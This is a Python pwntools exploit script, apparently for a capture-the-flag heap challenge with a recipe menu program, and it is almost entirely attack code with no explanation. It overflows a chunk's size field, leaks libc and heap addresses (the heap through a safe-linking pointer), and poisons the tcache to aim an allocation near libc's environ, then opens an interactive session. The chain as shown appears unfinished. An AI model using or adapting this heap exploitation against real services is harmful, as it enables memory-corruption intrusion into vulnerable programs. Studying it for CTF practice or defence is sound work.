#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = ""
PORT = 1234

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set follow-fork-mode parent
        set resolve-heap-via-heuristic force
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, idx, value):
    sl(p, b"1")
    ru(p,b"recipe?\n> ")
    sl(p,b"%i" % size)
    ru(p,b"on?\n> ")
    sl(p,b"%i" % idx)
    ru(p,b"recipe?\n> ")
    sl(p, value)
    ru(p,b">")

def edit(p, index, value):
    sl(p, b"4")
    ru(p,b">")
    sl(p,"%i" % index)
    ru(p,b">")
    sl(p,value)
    ru(p,b">")

def delete(p, index):
    sl(p, b"2")
    ru(p,b">")
    sl(p,"%i" % index)
    ru(p,b">")

def view(p, index):
    sl(p, b"3")
    ru(p,b"print?\n> ")
    sl(p,"%i" % index)
    ret = ru(p, b"\nWhat")
    ru(p,b"> ")

    return ret[:-5]
    

def exploit(io,e,l):
    # libc leak
    create(io, 0x18, 0, b"A"*0x18)
    create(io, 0x428, 1, b"B"*0x428)
    create(io, 0x158, 2, b"C"*0x50)
    create(io, 0x18, 3, b"D"*0x10)

    edit(io, 0, b"A"*0x18 + p64(0x431 + 0x160))

    delete(io, 1)
    create(io, 0x428, 1, b"B"*0x428)

    leak = view(io, 2)
    print(b"LEAK: " + leak)
    libc = int.from_bytes(leak, "little") - l.sym["main_arena"] - 96

    print(f"[*] libc @ 0x{libc:x}")

    # heap leak

    create(io, 0x158, 4, b"C"*0x50)
    delete(io, 2)

    leak = view(io, 4)
    mangle = int.from_bytes(leak, "little") 
    heap = mangle << 12

    print(f"[*] heap @ 0x{heap:x}")

    # tcache poisoning

    edit(io, 1, b"B"*0x428 + p64(0x21))
    delete(io, 4)

    create(io, 0x178, 2, p64((l.sym["environ"] + libc - 0x18) ^ mangle))
    create(io, 0x158, 4, p64((l.sym["environ"] + libc - 0x18) ^ mangle))
    create(io, 0x18, 5, b"A")
    create(io, 0x18, 6, b"A")
    create(io, 0x18, 7, b"A")
    create(io, 0x18, 8, b"A")

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
